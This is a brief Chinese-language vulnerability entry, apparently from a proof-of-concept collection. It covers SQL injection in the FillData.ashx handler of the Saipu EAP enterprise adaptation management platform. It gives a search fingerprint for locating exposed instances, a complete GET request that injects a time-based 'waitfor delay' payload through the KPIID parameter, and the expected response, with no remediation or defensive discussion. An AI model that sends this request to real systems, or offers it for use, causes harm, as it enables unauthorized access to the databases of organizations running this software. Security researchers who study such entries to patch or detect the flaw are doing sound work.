# 赛普EAP企业适配管理平台FillData.ashx存在SQL注入漏洞

赛普EAP企业适配管理平台 ｜ SQL注入 ｜ —
- **指纹**：`body="IDWebSoft"`
- **请求**：`GET /IDWebSoft/FillData.ashx?action=HR_GetKPIIndexFormulaInfo&KPIID=1';waitfor+delay+'0:0:3'--+q HTTP/1.1`
- **响应特征**：200